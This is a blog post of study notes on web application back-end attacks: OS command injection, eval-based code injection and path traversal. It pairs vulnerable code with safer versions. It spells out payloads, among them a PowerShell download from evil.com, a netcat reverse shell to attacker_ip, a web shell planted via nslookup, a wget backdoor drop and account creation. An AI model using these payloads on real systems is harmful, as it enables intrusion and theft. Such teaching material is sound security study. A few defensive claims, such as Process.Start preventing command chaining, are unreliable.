**Note:** This is the fifth installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

## Attacking Back-End Components:

Modern web applications are intricate systems that act as front-facing gateways to critical business resources. These include networked services such as APIs, web services, and mail servers, as well as local components like file systems and operating system interfaces. Often, the application server itself enforces discretionary access control over these back-end components. This means that any successful attack allowing direct interaction with these resources could bypass the web application's access controls entirely—granting unauthorized access to sensitive data and critical functionality.

When data moves between components, it passes through different APIs and interfaces, each with its own way of handling encoding, escape sequences, delimiters, and special characters. What appears "safe" at the application level might be highly dangerous in the back-end system. Furthermore, these back-end components often have far more capabilities than the web application exposes. A well-executed injection attack can do more than just circumvent access restrictions—it can leverage hidden functionality to escalate privileges, exfiltrate data, or even compromise the organization’s core infrastructure.

### Injecting OS Commands:

Most modern web server platforms provide built-in APIs for interacting with the operating system in a controlled manner. These APIs allow developers to access the filesystem, communicate with other processes, and handle network operations safely. However, in some cases, developers opt for a more direct approach—issuing raw operating system commands. This method can be appealing due to its power and simplicity, often providing an immediate solution to specific problems.

Functions like ```exec()``` **in PHP** and ```wscript.shell``` **in ASP** impose no restrictions on what commands can be executed. A developer might intend to perform a simple task, like listing directory contents, but an attacker could subvert it to write arbitrary files, escalate privileges, or launch unauthorized programs. The injected commands typically run with the same privileges as the web server process—often providing enough access to compromise the entire system.

These vulnerabilities are frequently found in both off-the-shelf and custom-built web applications. They are particularly common in administrative interfaces, such as web-based control panels for enterprise servers, firewalls, routers, and printers. These applications often require deeper OS interactions, leading developers to use direct command execution, sometimes unknowingly exposing the system to injection attacks.

In short, injection attacks are like digital alchemy—turning innocent input fields into full-fledged access portals. There's something deeply satisfying about sneaking malicious payloads past filters and watching them execute like magic. Plus, the sheer versatility—SQLi, OS command injection, SSTI, LFI—they all have that same core principle: bending the system to your will through misinterpreted input. It's like playing an instrument where instead of notes, you're composing payloads, fine-tuning them until they break the system just right.

#### Example 1: Injecting via Perl:

Perl is a high-level programming language that was widely used in web development, system administration, and networking in the past. While it has largely been replaced by Python and more modern web technologies, it is still encountered in legacy applications, especially in older CGI-based web applications. Understanding Perl-based vulnerabilities remains valuable since many older systems still rely on it, making them prime targets for exploitation.

Consider the following Perl CGI script, which is part of a web-based administration tool. This function is designed to allow administrators to specify a directory on the server and view a summary of its disk usage:

```
#!/usr/bin/perl  
use strict;   # Enforce strict variable usage  
use warnings; # Enable warnings  
use CGI qw(:standard escapeHTML); # Load CGI module for web responses  

# Send HTTP response headers and start HTML  
print header, start_html("Disk Usage Viewer");  
print "<pre>";  # Start preformatted text block  

# Define a base shell command  
my $command = "du -h --exclude php* /var/www/html";  

# Append user-supplied input (DANGEROUS!)
$command .= param("dir");  

# Execute the command (ALSO DANGEROUS!)
print `$command`;  

print "</pre>";  # Close preformatted text block  
print end_html;  # Close HTML  
```

**Code Issues and Explanation:**

1. Lack of Input Sanitization:

- The script directly appends user input (```param("dir")```) to the ```$command``` variable without validation. This allows an attacker to inject arbitrary shell commands by manipulating the ```dir``` parameter.

2. Injection Vector: Shell Metacharacters:

- The backticks around ```$command``` execute it in the shell, i.e. *"run this command in the shell and return its output as a string."* If an attacker submits ```"; cat /etc/passwd"``` as input, the final command executed by the system would be:

```
du -h --exclude php* /var/www/html"; cat /etc/passwd
```

Let’s test a simple backtick command:

```
my $output = `ls -l`;  # Runs "ls -l" and captures the output
print "Files in directory:\n$output";
```

If you run this, it will list the files in the directory:

```
Files in directory:
-rw-r--r--  1 user  user   1234 Mar 15 12:00 notes.txt
-rwxr-xr-x  1 user  user   4567 Mar 14 15:30 script.pl
```

So, Perl executed ```ls -l```, grabbed the output, and stored it in ```$output```.

**Additional Notes:**

```
du -h --exclude php* /var/www/html
```

This is a Linux shell command that checks disk usage in a specific directory.

- ```du``` → Stands for **"Disk Usage"**. It reports the amount of disk space used by files and directories.

- ```-h``` → **"Human-readable"** format. Instead of raw bytes, it displays sizes like ```1K```, ```512M```, ```2G```, etc.

- ```--exclude php*``` → Excludes files or directories that start with ```php```. This is useful to avoid including unwanted files in the report.

- ```/var/www/html``` → This is the **target directory** (commonly used for hosting web pages in Apache servers).

Example Output of ```du -h``` in a Real System:

```
4.0K    /var/www/html/images
12M     /var/www/html/uploads
3.4G    /var/www/html/logs
```

Moving on to the next interesting detail:

```
print header, start_html("");  
print "<pre>";
```

This is CGI (Common Gateway Interface) Perl Code used to generate HTML output dynamically. Let’s break it down:

1. ```print header;```

- This sends an HTTP header to the browser. Without this, the browser won’t know what kind of response to expect. The default header is ```Content-Type: text/html```, meaning the browser will treat the response as an HTML page.

2. ```start_html("");```

- This starts the HTML document. The empty ```""``` means no custom title or attributes are provided. It’s equivalent to writing:

```
<html>
<head><title></title></head>
<body>
```

3. ```print "<pre>";```

- ```<pre>``` is an HTML tag that tells the browser to display text exactly as it appears, preserving spaces and newlines. This is useful for showing command output in a readable way. Example:

```
<pre>
Directory listing:
file1.txt
file2.txt
</pre>
```

Without ```<pre>```, the output might get squished together.

Overall, an attacker can exploit this by making a request to the vulnerable script:

```
http://example.com/admin.cgi?dir=";cat /etc/passwd"
```

This would cause the server to execute:

```
du -h --exclude php* /var/www/html
cat /etc/passwd
```

Since ```cat /etc/passwd``` outputs the system's password file, this attack could reveal sensitive user information.

A safer approach would look like this:

```
use strict;
use warnings;
use CGI qw(:standard escapeHTML);

print header, start_html("");  
print "<pre>";

my $dir = param("dir");

# Validate input (allow only alphanumeric and slashes)
if ($dir !~ m{^[-\w/]+$}) {
    die "Invalid directory name!";
}

# Use a safer API instead of executing shell commands
opendir(my $dh, $dir) or die "Cannot open directory: $!";
while (my $file = readdir($dh)) {
    print "$file\n";
}
closedir($dh);

print "</pre>";
print end_html;
```

- The safer method of interacting with the filesystem (using ```opendir()```, ```readdir()```, and ```closedir()```) avoids shell command injection and keeps the application secure.

**Complete Breakdown:**

1. The script begins with these lines:

```
use strict;
use warnings;
use CGI qw(:standard escapeHTML);
```

- ```use strict;```: Enforces good coding practices by preventing variable errors (like typos in variable names).

- ```use warnings;```: Gives warnings about potential issues in the code (such as uninitialized variables).

- ```use CGI qw(:standard escapeHTML);```: Includes the ```CGI``` module and loads standard CGI functions (```param()```, ```header()```, etc.) to handle web input and output. The ```escapeHTML``` function is used to sanitize input and prevent XSS (Cross-Site Scripting).

2. HTML Output Setup:

```
print header, start_html("");
print "<pre>";
```

- ```header```: Prints the necessary HTTP headers for the response (content-type, etc.).

- ```start_html("")```: Starts an HTML page (with an optional title or other settings inside the parentheses, which is empty here).

- ```<pre>```: Begins a ```<pre>``` block, which keeps the formatting (like newlines) of any printed text.

3. Get User Input:

```
my $dir = param("dir");
```

- ```param("dir")```: Retrieves the user input for the ```dir``` parameter, typically passed via the URL or form (```?dir=/some/path```).

4. Input Validation with Regex:

```
if ($dir !~ m{^[-\w/]+$}) {
    die "Invalid directory name!";
}
```

- ```$dir !~```: This means "if ```$dir``` doesn't match the pattern."

- ```m{^[-\w/]+$}```: This is the regex pattern used to validate the dir input. Let’s break it down:

```^```: Asserts the start of the string. ```[-\w/]```: This defines a character class that matches: ```-```: Dash (often used in filenames), ```\w```: Word characters (alphanumeric characters and underscores), ```/```: Slash (needed for directory paths), ```+```: Ensures the previous set of characters appears one or more times (so dir can't be empty), ```$```: Asserts the end of the string.

This regex only allows alphanumeric characters, underscores, dashes, and slashes (which are safe characters in a directory name). So, it will reject anything like ```;```, ```&```, or ```|``` (which would be used in command injection).

If the ```dir``` parameter contains any invalid characters, the script will die and output: ```Invalid directory name!```.

5. Open and Read the Directory:

```
opendir(my $dh, $dir) or die "Cannot open directory: $!";
while (my $file = readdir($dh)) {
    print "$file\n";
}
closedir($dh);
```

- ```opendir(my $dh, $dir)```: Opens the directory stored in ```$dir```. ```$dh``` is a directory handle.

- ```readdir($dh)```: Reads the next entry (file or directory) from the opened directory and stores it in ```$file```.

- ```print "$file\n"```: Prints each filename or directory name followed by a newline (```\n```).

- ```closedir($dh)```: Closes the directory handle once done.

6. Finish HTML Output:

```
print "</pre>";
print end_html;
```

- ```</pre>```: Closes the <pre> block from earlier.

- ```end_html```: Ends the HTML document, closing the ```<html>``` tag and finalizing the response.

#### Example 2: Injecting via ASP.NET (C#):

ASP.NET applications sometimes execute system commands for administrative tasks. If user input is not properly sanitized, this can lead to command injection. Consider the following vulnerable C# code, which allows administrators to list files in a given directory:

```
using System;
using System.Diagnostics;

public class Example
{
    public static void RunCommand(string userInput)
    {
        // Constructing the directory path from user input
        string dirName = "C:\\filestore\\" + userInput;

        // Setting up a command execution
        ProcessStartInfo psInfo = new ProcessStartInfo("cmd.exe", "/c dir " + dirName);
        Process proc = Process.Start(psInfo);
    }
}
```

**Breakdown of the Vulnerability:**

- ```dirName``` is constructed by directly **concatenating** user input (```userInput```). This is dangerous because an attacker can inject special characters into it.

- The ```ProcessStartInfo``` object **launches the Windows command shell** (```cmd.exe```) and executes ```dir``` to list directory contents.

- **No input validation** is performed, meaning an attacker can manipulate ```userInput``` to execute unintended commands.

Since Windows uses the ampersand (```&```) to chain commands, an attacker could input something like:

```
& net user Hacker P@ssword123 /add
```

The final command executed would be:

```
cmd.exe /c dir C:\filestore\ & net user Hacker P@ssword123 /add
```

This would create a new user account named ```Hacker``` with the password ```P@ssword123``` on the system.

**Other Injection Techniques:**

- **Double ampersands** (```&&```) → Executes a second command only if the first one succeeds.

- **Pipe** (```|```) → Redirects output to another command.

- **Redirection** (```>```, ```>>```) → Writes command output to a file.

- **Backticks, ```%COMSPEC%```, and environment variables** can also be abused. ```%COMSPEC%``` is an environment variable in Windows that points to the system's command-line interpreter (typically ```C:\Windows\System32\cmd.exe```). Attackers can manipulate it to execute arbitrary commands or replace it with something malicious. Example:

```
set COMSPEC=C:\malicious.exe
```

Now, whenever the system tries to execute ```cmd.exe```, it will run the attacker's payload instead. 

- Backticks are escape characters in PowerShell but can also be used creatively for obfuscation. Attackers sometimes use them to bypass detection mechanisms by breaking up keywords:

```
iex ("n`e`w-o`b`j`e`c`t ne`T.we`b`c`l`i`e`n`t").DownloadString("http://evil.com/malware.ps1")
```

To prevent command injection:

- Use built-in .NET APIs instead of executing shell commands.

- Validate and sanitize user input before using it.

- Restrict user permissions so they can’t execute arbitrary commands.

Safer alternative:

```
using System;
using System.IO;

public class SafeExample
{
    public static void ListFilesSafely(string userInput)
    {
        string basePath = @"C:\filestore\";
        string sanitizedInput = Path.GetFullPath(Path.Combine(basePath, userInput));

        // Ensure the directory is within allowed bounds
        if (!sanitizedInput.StartsWith(basePath))
        {
            throw new UnauthorizedAccessException("Invalid directory path!");
        }

        // List files safely
        string[] files = Directory.GetFiles(sanitizedInput);
        foreach (var file in files)
        {
            Console.WriteLine(file);
        }
    }
}
```

- By removing ```Process.Start()``` and replacing it with ```.EnumerateFiles()```, we completely eliminate the possibility of command injection—because there’s no command to inject into anymore! Also, it uses built-in filesystem APIs (```Directory.GetFiles()``` instead of executing external processes).

**Detailed Breakdown:**

```
using System;
using System.IO;
```

- ```using System;``` → Includes the base library for fundamental .NET functionalities like console input/output.

- ```using System.IO;``` → Includes file system-related operations (reading, writing, listing files, etc.).

```
public class SafeExample
```

- Defines a class called ```SafeExample```. In C#, all code needs to be inside a class (except for minimal console applications).

```
public static void ListFilesSafely(string userInput)
```

- Declares a static method named ```ListFilesSafely```.

- ```static``` means it belongs to the class itself and doesn’t require an instance to be called.

- Takes a user-supplied input string (```userInput```), which represents the directory name.

- ```userInput``` is just a placeholder that gets its value from wherever the function is used. In other words, it isn’t defined inside the method because it is provided when the function is called.

```
string basePath = @"C:\filestore\";
```

- Defines a base directory (```C:\filestore\```) where the script will operate.

- The ```@``` before the string makes it a verbatim string, so backslashes (```\```) don’t need to be escaped (```\\```).

```
string sanitizedInput = Path.GetFullPath(Path.Combine(basePath, userInput));
```

- Combines the base path (```C:\filestore\```) with ```userInput``` to create the full directory path.

- ```Path.Combine(basePath, userInput)``` → Joins paths safely without manually using slashes (```\``` or ```/```).

- ```Path.GetFullPath(...)``` → Normalizes the final path to prevent tricks like ```..\..``` (directory traversal attacks).

Also, attackers might try:

```
userInput = "..\..\Windows\System32"
```

Without ```GetFullPath()```, this could trick the program into escaping the base directory!

```
if (!sanitizedInput.StartsWith(basePath))
{
    throw new UnauthorizedAccessException("Invalid directory path!");
}
```

- Prevents directory traversal attacks by ensuring ```sanitizedInput``` still starts with the ```basePath```.

```
string[] files = Directory.GetFiles(sanitizedInput);
```

- Retrieves a list of all files in the ```sanitizedInput``` directory. Unlike ```Process.Start()```, this does not execute system commands, making it much safer.

```
foreach (var file in files)
{
    Console.WriteLine(file);
}
```

- Loops through the file list and prints each filename to the console.

- ```Console.WriteLine(file);``` → Displays the full path of each file found.

#### Injecting Through Dynamic Execution:

Many programming languages allow dynamic execution, meaning they can generate and run code on the fly. This is useful when applications need to modify their behavior based on real-time conditions, such as user input or stored configurations. However, if this mechanism is not handled properly, it can lead to severe security vulnerabilities, allowing attackers to inject arbitrary code and execute system commands.

A common goal of attackers exploiting dynamic execution is to break out of the intended data context and execute OS commands. This is often done by injecting specially crafted input that forces the application to interpret user-supplied data as actual code.

**PHP and the ```eval()``` Function:**

One infamous example of dynamic execution is PHP’s ```eval()``` function. This function takes a string and executes it as PHP code. While this can be useful in some situations, it also presents a huge security risk if user input is directly passed to it.

Consider the following example of a search feature that allows users to store predefined search queries. The user accesses this functionality with a URL like:

```
/search.php?storedsearch=\$mysearch%3dwahh
```

On the server-side, the PHP application retrieves the ```storedsearch``` parameter from the URL and executes it dynamically using ```eval()```:

```
$storedsearch = $_GET['storedsearch'];
eval("$storedsearch;");
```

Breaking It Down:

1. User sends a GET request:

- ```storedsearch=\$mysearch%3dwahh```

This URL-encoded parameter translates to ```$mysearch=wahh``` in PHP.

2. The application retrieves the parameter:

- ```$storedsearch = $_GET['storedsearch'];```

This means ```$storedsearch``` now contains the string ```"$mysearch=wahh"```.

3. PHP executes the string using ```eval()```:

- ```eval("$storedsearch;");```

This results in PHP actually defining a variable ```$mysearch``` with the value ```"wahh"```, as if it were written manually in the code.

Since ```eval()``` **blindly executes whatever string is passed to it**, an attacker can inject arbitrary PHP commands by manipulating the ```storedsearch``` parameter.

For example, if an attacker sends the following request:

```
/search.php?storedsearch=\$mysearch%3dwahh;%20echo%20file_get_contents('/etc/passwd')
```

It gets processed as:

```
eval('$mysearch=wahh; echo file_get_contents("/etc/passwd");');
```

Which means PHP will execute:

```
$mysearch = "wahh";  
echo file_get_contents('/etc/passwd');
```

This retrieves and displays the contents of ```/etc/passwd```, a critical system file.

Similarly, an attacker can execute OS commands:

```
/search.php?storedsearch=\$mysearch%3dwahh;%20system('cat%20/etc/passwd')
```

Gets executed as:

```
$mysearch = "wahh";  
system("cat /etc/passwd");
```

This uses PHP’s ```system()``` function to execute the ```cat /etc/passwd``` command, effectively displaying the file.

**Other Languages with Similar Issues:**

The same kind of exploit is possible in other languages that support dynamic execution:

1. Perl:

- The ```eval()``` function in Perl works the same way and can be abused similarly.

- Example: ```eval($user_input);```

- Exploit: ```?input=system("cat /etc/passwd")```

2. Classic ASP (VBScript):

- The ```Execute()``` function allows execution of dynamically generated code.

- Example: ```Execute("x=" & Request.QueryString("input"))```

- Exploit: ```?input=MsgBox("Hacked!")```

**Additional Notes:**

In ASP (VBScript), the ```Execute()``` function is similar to PHP’s ```eval()```. It takes a string and runs it as code. Imagine this simple ASP script running on a server:

```
<%
Dim input
input = Request.QueryString("input") ' Get user input from URL
Execute("x=" & input) ' Dynamically execute user-supplied input
Response.Write(x) ' Print result
%>
```

Breaking It Down:

- Request.QueryString("input") retrieves the input parameter from the URL.

- ```Execute("x=" & input)``` dynamically executes whatever string the user provides, treating it as if it were actual VBScript code.

- ```Response.Write(x)``` then outputs the result to the page.

If a user visits:

```
http://example.com/vuln.asp?input=MsgBox("Hacked!")
```

Then the server executes:

```
Execute("x=MsgBox('Hacked!')")
```

Since ```MsgBox("Hacked!")``` is a valid VBScript command that displays a message box, this results in a popup message appearing on the server. Also, attackers could do much worse than displaying popups. They could execute system commands using ```WScript.Shell```, effectively turning the web server into a command execution playground:

```
http://example.com/vuln.asp?input=CreateObject("WScript.Shell").Run("cmd /c whoami")
```

Which executes:

```
Execute("x=CreateObject(""WScript.Shell"").Run(""cmd /c whoami"")")
```

This runs ```cmd /c whoami``` on the server, revealing which user account the web server is running under.

3. Python:

- ```eval()``` and ```exec()``` can execute arbitrary Python code.

- Example: ```eval(user_input)```

- Exploit: ```?input=__import__('os').system('cat /etc/passwd')```

**To prevent this catastrophic vulnerability:**

- Avoid ```eval()``` whenever possible—there’s usually a better way.

- Use whitelisting: Only allow predefined operations, rather than blindly executing user input.

- Use strict data validation: Only allow input that matches expected formats.

- Employ parameterized queries: For database queries, use prepared statements to prevent SQL injection.

- Use safe string parsing instead of execution: If you need to store configurations, consider ```json_decode()``` instead of ```eval()```.

### Finding OS Command Injection Flaws:

During application mapping, you should identify cases where the web application interacts with the underlying operating system. This might happen through executing external processes, accessing the filesystem, or performing administrative tasks. Any user input that gets passed to these system commands is a potential target for OS command injection.

However, command injection isn’t always obvious. Any user-supplied data—URLs, body parameters, cookies, or headers—could be vulnerable. Since web applications can run commands using different shell interpreters, you can’t assume how metacharacters (special shell symbols) are handled just by knowing the web server’s OS. You must test all input fields systematically to find injection points.

Different operating systems and shell interpreters handle command separators differently. Here’s a breakdown of how attackers can chain commands or inject new ones into an existing system call.

1. Using Command Chaining Operators:

Shells allow multiple commands to be executed in sequence using special metacharacters:

- ```;``` Executes multiple commands sequentially (Linux & Windows)

- ```&``` Executes multiple commands in parallel (Linux & Windows)

- ```&&``` Executes the second command only if the first succeeds (Linux & Windows)

- ```\n``` (newline) Works like ```;``` (Linux shells)

If an application executes a system command like this:

```
<?php
$ip = $_GET['ip'];
system("ping " . $ip);
?>
```

A normal request would be:

```
http://example.com/ping.php?ip=127.0.0.1
```

However, if the input is not sanitized, an attacker can inject a new command:

```
http://example.com/ping.php?ip=127.0.0.1; whoami
```

Which results in:

```
ping 127.0.0.1; whoami
```

This executes both ```ping 127.0.0.1``` and ```whoami```, leaking the server's user account.

On Windows, an attacker might try:

```
http://example.com/ping.php?ip=127.0.0.1 && net user
```

Which would run:

```
ping 127.0.0.1 && net user
```

Listing all user accounts on the system.

2. Injecting Commands with Backticks ```(`)```

The backtick ```(`)``` is a lesser-known method of injection, primarily affecting Linux shells (bash/sh/zsh). Placing a command inside backticks causes the shell to execute the command and replace it with its output before running the rest of the command.

If an application executes a command like this:

```
<?php
$user = $_GET['user'];
system("echo Welcome, " . $user);
?>
```

An attacker could inject:

```
http://example.com/greet.php?user=`whoami`
```

Which turns into:

```
echo Welcome, $(whoami)
```

The shell replaces ````whoami```` with the actual username, resulting in output like:

```
Welcome, www-data
```

This reveals the user running the web application.

**Windows PowerShell Variant:**

Although Windows CMD does not support backticks for command execution, PowerShell does via ```$(command)```:

```
Write-Output "Welcome, $(whoami)"
```

Would output:

```
Welcome, Administrator
```

**Detecting Blind Command Injection:**

Sometimes, injected commands don’t return visible output, making detection harder. In such cases, use time-based inference—just like in blind SQL injection.

If you suspect a vulnerable input, try injecting a delay:

```
127.0.0.1; sleep 10
```

Or in Windows:

```
127.0.0.1 && timeout /T 10
```

If the server takes 10 seconds to respond, it’s likely vulnerable.

#### More on Detecting OS Command Injection via Time Delays:

As we can see, one effective way to identify OS command injection vulnerabilities is by using time delays to observe whether user input affects the execution time of a command. If an injected command causes a noticeable delay in the application's response, it may indicate that the input is being executed by the system.

**Step 1: Using ```ping``` for Time Delays:**

A common method to trigger a time delay is to have the server ping its own loopback interface (```127.0.0.1```) for a specified duration. Different operating systems and shell interpreters handle command separators and the ```ping``` command differently, but the following test string should induce a 30-second delay on most systems if no filtering is in place:

```
| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
```

- ```-i 30``` (Linux/macOS) → Tells the system to wait 30 seconds between pings.

- ```-n 30``` (Windows) → Tells Windows to send 30 pings (with a ~1-second interval each).

If the response is delayed by approximately 30 seconds, it suggests that the input is being executed by the server.

To maximize the chances of detecting injection, try alternative payloads:

```
%0a ping -i 30 127.0.0.1 %0a ping 127.0.0.1
```

- ```%0a``` is a URL-encoded newline (```\n```), which may bypass input filtering.

- The second ```ping``` command runs without the ```-i``` flag, acting as a control test.

**Step 2: Confirming the Vulnerability:**

If you observe a delay in the application's response, repeat the test multiple times to rule out network latency or random server slowdowns. Modify the delay value (```-i 5```, ```-i 10```, etc.) and check whether the response time scales accordingly. A predictable change in response time strongly indicates a vulnerability.

**Step 3: Executing Arbitrary Commands:**

Once a working injection payload is found, try executing other system commands, such as:

```
whoami   (Linux/macOS/Windows) → Returns the username of the executing process.
ls       (Linux/macOS) → Lists files in the current directory.
dir      (Windows) → Lists files in the current directory.
```

If the command’s output appears in the response, direct command execution is possible. If not, alternative methods are needed.

**Step 4: Retrieving Command Output:**

If command execution is confirmed but results are not displayed, you can try:

1. Out-of-band channels:

- Uploading tools using ```tftp``` or ```curl```.

- Creating a reverse shell using ```netcat``` or ```telnet```.

- Sending output via email using the ```mail``` command.

2. Writing output to a web-accessible directory:

- Windows:

```
dir > C:\inetpub\wwwroot\output.txt
```

- Linux:

```
ls > /var/www/html/output.txt
```

Once the output is written, access it through a browser:

```
http://target.com/output.txt
```

**Step 5: Privilege Escalation and Lateral Movement:**

After gaining command execution, determine the process's privilege level:

```
whoami  
id  
```

If running as a low-privileged user, attempt privilege escalation via:

- Misconfigured sudo permissions (```sudo -l```)

- Exploitable services (e.g., outdated software)

- Kernel exploits (if running an old OS version)

Once root/system privileges are obtained, you can access sensitive data or pivot to other hosts.

**Bypassing Strict Filtering via Indirect Command Injection:**

Sometimes, direct command injection is not possible due to filtering. However, you can manipulate the behavior of existing system commands to achieve similar effects.

Consider an application that passes user input to the ```nslookup``` command to resolve domain names:

```
nslookup example.com
```

If common injection characters (```;```, ```|```, ```&```) are blocked, the attack surface may seem limited. However, the ```<``` and ```>``` output redirection operators might still be allowed.

Since ```nslookup``` returns error messages containing user input, an attacker can:

1. Submit malicious script code as the domain name:

```
nslookup "<?php system(\$_GET['cmd']); ?>" > /var/www/html/backdoor.php
```

2. When the command runs, an error occurs, and ```nslookup``` writes the error message (which includes attacker-controlled input) into a file.

3. If the target server executes PHP, JavaScript, or another scripting language, the file can be accessed via a browser to trigger remote code execution.

```
http://target.com/backdoor.php?cmd=id
http://target.com/backdoor.php?cmd=whoami
http://target.com/backdoor.php?cmd=nc -e /bin/bash attacker_ip attacker_port
```

**Why Does This Work?**

- ```nslookup``` does not sanitize input, so the injected script remains intact in the error message.

- The error message is redirected to a web-accessible file, effectively turning a limited injection into arbitrary script execution.

- The script executes when accessed via a browser, granting full access to the server.

If filtering blocks certain characters, you can encode the payload:

```
nslookup "<?php echo shell_exec(base64_decode(\$_GET['cmd'])); ?>" > /var/www/html/backdoor.php
```

Then, send commands in Base64 format:

```
echo -n "nc -e /bin/bash attacker_ip attacker_port" | base64
```

Use the encoded string in your request:

```
http://target.com/backdoor.php?cmd=bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyX2lwIGF0dGFja2VyX3BvcnQ=
```

Even if an application prevents direct command execution, alternative techniques like time delays, output redirection, and encoding tricks can still be used to gain control. By carefully analyzing the application's behavior and testing different input variations, an attacker can escalate from simple injections to full server compromise.

#### Command Injection Tips and Techniques:

1. Using ```<``` and ```>``` for File Manipulation:

The ```<``` and ```>``` characters in command-line environments serve important purposes:

- ```<``` (input redirection) takes the contents of a file and feeds it as input to a command.

- ```>``` (output redirection) writes the output of a command to a file, overwriting it.

- ```>>``` (append redirection) adds output to an existing file instead of overwriting it.

These redirections can be useful in cases where injecting entirely new commands is blocked. If command injection allows for ```<``` and ```>```, you may still be able to read sensitive files or overwrite existing files to plant malicious payloads.

Example (reading a file in Linux):

```
cat </etc/passwd
```

This would pass ```/etc/passwd``` as input to the ```cat``` command, displaying its contents.

Example (overwriting a file in Windows):

```
echo Malicious content > C:\inetpub\wwwroot\backdoor.asp
```

This writes ```Malicious content``` into a file inside the web root, potentially executing a web shell if the server runs ASP.

2. Leveraging Command-Line Parameters for Injection:

Many OS commands accept additional parameters that modify their behavior. Sometimes, applications take user input and pass it as an argument to an underlying system command. If input validation is weak, you may be able to insert extra parameters simply by adding a space and specifying an additional flag.

Suppose a web-based application retrieves a user-specified URL and renders its contents in a browser. If this application uses the ```wget``` utility like this:

```
wget http://example.com/somefile
```

Then an attacker might inject an additional parameter to write a file onto the server:

```
wget http://wahh-attacker.com/malicious.php -O /var/www/html/backdoor.php
```

The ```-O``` flag tells ```wget``` to save the retrieved file as ```backdoor.php```, effectively planting a malicious script on the webserver.

**Additional Notes:**

If an application is blindly fetching user-supplied URLs, it can be highly vulnerable to SSRF (Server-Side Request Forgery). You could manipulate the request to make the server fetch internal resources, access metadata services (like AWS' ```169.254.169.254```), or even interact with private APIs that are otherwise inaccessible from the outside.

For example, if the web app calls ```wget``` like this:

```
wget $USER_INPUT
```

And you provide:

```
http://localhost/admin
```

The server might unknowingly retrieve privileged content from its internal services. Even worse, if you can write files (e.g., using ```-O``` or ```-o``` with ```wget```), you could plant a backdoor in the web root as previously shown.

3. Bypassing Space Filtering with ```$IFS``` (Unix-based Systems):

If spaces are blocked or stripped, an alternative is to use the Internal Field Separator (```IFS```) environment variable in Unix-based systems. By default, ```$IFS``` contains space, tab, and newline characters, allowing command-line arguments to be separated in creative ways.

Example (bypassing space filtering):

```
bash$ VAR="cat${IFS}/etc/passwd"
bash$ eval $VAR
```

Here, ```$IFS``` replaces the space between cat and /etc/passwd, allowing command execution without an actual space character.

#### Understanding Command Injection via Dynamic Execution Functions:

1. User Input and Dynamic Execution:

Any piece of user-supplied data might be passed to a function that dynamically executes code. This includes cookie values, form parameters, and even persistent data saved from previous user interactions. If an application does this without proper sanitization, it opens the door to command or code injection attacks.

2. Testing for Injection:

To check if a parameter is being executed dynamically, try submitting variations of the following payloads:

```
;echo 111111
echo 111111
response.write 111111
:response.write 111111
```

- ```;echo 111111``` → If shell execution is possible, this might print ```111111``` to the output. The ```;``` is often used to chain commands in Unix-based shells.

- ```echo 111111``` → A basic test to see if input is being directly executed.

- ```response.write 111111``` → This is specific to web technologies like ASP/VBScript, where ```response.write``` outputs content in server-side code execution.

- ```:response.write 111111``` → The ```:``` might be an attempt to bypass certain filters or trigger unexpected behavior in some parsing engines.

3. Analyzing Responses:

If ```111111``` appears in the output **without** additional command strings, the input is likely being evaluated dynamically—meaning injection is possible.

If nothing appears, check for errors that indicate the input is being processed but syntax might need tweaking.

4. Advanced PHP Testing:

If the application is PHP-based, a good test string is:

```
phpinfo();
```

If executed, this will display detailed configuration info about the PHP environment—confirming that code execution is possible.

5. Verifying Execution via Time Delays:

If injection seems possible, confirm it by injecting time-based payloads. A common example for OS command injection is a **ping delay**:

```
system('ping -c 5 127.0.0.1');
```

If the server takes noticeably longer to respond, it confirms that the command was successfully executed.

### Preventing OS Command Injection:

The best way to prevent OS command injection vulnerabilities is to **avoid executing system commands directly.** Almost any operation a web application needs can be handled using **built-in APIs** rather than calling the operating system’s command interpreter. APIs are generally safer because they don’t allow arbitrary command execution beyond their intended purpose.

However, if executing system commands is unavoidable, strict defenses must be in place:

- **Use a whitelist:** Restrict user input to a predefined set of allowed values.

- **Enforce strict input validation:** Accept only alphanumeric characters and explicitly reject anything that contains spaces, metacharacters (```|```, ```&```, ```;```, ```>```, ```<```, etc.), or unexpected symbols.

- **Use safe command execution APIs:** Instead of passing user input into a shell interpreter, use APIs that invoke processes safely.

**Java:** ```Runtime.exec()``` allows executing commands but prevents shell metacharacter injection.

**ASP.NET:** ```Process.Start()``` runs programs directly without allowing command chaining.

**Python:** ```subprocess.run([...], shell=False)``` ensures that the command is executed as intended.

These methods significantly reduce the risk of attackers injecting additional commands via metacharacters or unexpected input.

#### Preventing Script Injection Vulnerabilities:

Script injection occurs when an application dynamically executes user-supplied input or data derived from it. To prevent these vulnerabilities:

- **Avoid passing user input into dynamic execution functions** (e.g., ```eval()```, ```exec()```, ```setTimeout()```, ```setInterval()```, or template engines that process input dynamically).

- **Use a strict whitelist** of expected values wherever possible.

- **Validate and sanitize input** by allowing only necessary characters (e.g., alphanumeric characters without spaces).

For example, instead of this dangerous approach in JavaScript:

```
eval("var userInput = " + userProvidedData);
```

Use safe alternatives like strict comparisons or controlled execution:

```
const safeValues = { option1: true, option2: true };
if (safeValues[userProvidedData]) {
    executeSomething(userProvidedData);
}
```

**TL;DR:** Never execute user-controlled data directly—filter it, restrict it, or outright reject it.

#### Manipulating File Paths:

Many web applications interact with files and directories based on user input, such as retrieving files from a local server. If user input is not properly validated, this can lead to file path traversal or file inclusion vulnerabilities.

For example, an insecure approach in PHP:

```
$file = $_GET['file'];
include "/var/www/html/" . $file;
```

An attacker could request:

```
example.com/index.php?file=../../../../etc/passwd
```

Which could expose system files.

**Defensive Measures:**

- Use absolute paths and predefined directories instead of allowing user-controlled paths.

- Restrict input to expected filenames (e.g., allow only ```file1.txt```, ```file2.txt```, etc.).

- Block directory traversal attempts (```../```, ```%2e%2e/```, etc.).

- Use safe file-handling APIs that prevent path manipulation.

A safer PHP approach:

```
$allowedFiles = ['file1.txt', 'file2.txt'];
$file = $_GET['file'];
if (in_array($file, $allowedFiles)) {
    include "/var/www/html/" . $file;
} else {
    die("Unauthorized access!");
}
```

**Additional Notes:**

- The ```in_array()``` function in PHP is used to check if a value exists in an array. It returns ```true``` if the value is found and ```false``` otherwise.

Syntax:

```
in_array(mixed $needle, array $haystack, bool $strict = false): bool
```

- ```$needle```: The value to search for.

- ```$haystack```: The array to search in.

